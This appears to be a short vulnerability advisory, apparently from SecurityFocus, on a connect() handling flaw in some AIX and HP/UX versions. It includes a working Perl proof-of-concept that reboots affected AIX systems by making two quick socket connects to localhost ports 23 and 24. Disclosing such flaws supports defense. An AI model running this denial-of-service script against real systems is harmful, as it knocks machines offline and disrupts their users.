source: http://www.securityfocus.com/bid/352/info


Certain versions of AIX and HP/UX contained a bug in the way the OS handled the connect system call. The connect call is used to initiate a connection on a socket. Because of the flaw in the handling code under AIX certain versions will reboot when given two connects, one to a fixed port (a number of different ports were found to trigger this behaviour) and then another random port connection immediately thereafter. 

#!/usr/local/bin/perl5
use Socket;

socket (SOCK,AF_INET,SOCK_STREAM,0);
$iaddr = inet_aton('localhost');
$paddr = sockaddr_in('23',$iaddr);
connect SOCK,$paddr;
shutdown SOCK,2;
$paddr = sockaddr_in('24',$iaddr);
connect SOCK,$paddr;

